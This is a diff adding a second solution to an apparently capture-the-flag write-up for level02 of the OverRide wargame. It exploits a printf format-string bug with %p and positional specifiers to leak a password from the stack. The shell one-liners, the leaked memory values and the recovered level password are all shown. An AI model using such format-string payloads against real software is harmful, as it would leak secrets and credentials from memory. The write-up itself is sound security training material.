@@ -146,6 +146,50 @@ $ cat /home/users/level03/.pass
   Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 ```
 
+Another solution :
+
+We have printf exploit possibility as our buffer is used as the first argument of printf, we can bring our own modifiers. We can use that to print the stack starting from the printf function since we can't debug with gdb because of fopen issues etc...
+
+Let's check that :
+
+```shell
+./level02 
+  ===== [ Secure Access System v1.0 ] =====
+  /***************************************\
+  | You must login to access this system. |
+  \**************************************/
+  --[ Username: %p %p %p %p %p %p %p %p %p %p
+  --[ Password: AAAA
+  *****************************************
+  0x7fffffffe500 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x41414141 (nil) (nil) does not have access!
+```
+
+Ok, with the %p modifier we can see that our buffer "AAAA" starts at the 8th argument.
+We also know that our password buffer starts at `[rbp-0x110]` in the stack and the flag starts at `[rbp-0xa0]` => difference of 0x70 = 112 bytes.
+Since `%p` is printing a maximum of 8 bytes long arguments, the flag argument position will be after 14 arguments (112 / 8 = 14), which means the 22th (our password is 8th, so 14 + 8 = 22)
+
+```shell
+(python -c 'print("%22$p "+"%23$p "+"%24$p "+"%25$p "+"%26$p "+"%27$p "+"%28$p")' ; python -c 'print("AAAA")')  | ./level02
+  ===== [ Secure Access System v1.0 ] =====
+  /***************************************\
+  | You must login to access this system. |
+  \**************************************/
+  --[ Username: --[ Password: *****************************************
+  0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x3225207024323225 does not have access!
+```
+
+Now that we have the flag values (terminated by a `(nil)` value), we can put it in the `username` buffer and let the error part print it for us ("`username` does not have access!")
+
+```shell
+level02@OverRide:~$ (python -c 'print("\x48\x68\x37\x34\x52\x50\x6e\x75"+"\x51\x39\x73\x61\x35\x4a\x41\x45"+"\x58\x67\x4e\x57\x43\x71\x7a\x37"+"\x73\x58\x47\x6e\x68\x35\x4a\x35"+"\x4d\x39\x4b\x66\x50\x67\x33\x48")' ; python -c 'print("AAAA")')  | ./level02
+  ===== [ Secure Access System v1.0 ] =====
+  /***************************************\
+  | You must login to access this system. |
+  \**************************************/
+  --[ Username: --[ Password: *****************************************
+  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
+```
+
 ## Sources
 
 ### ASM
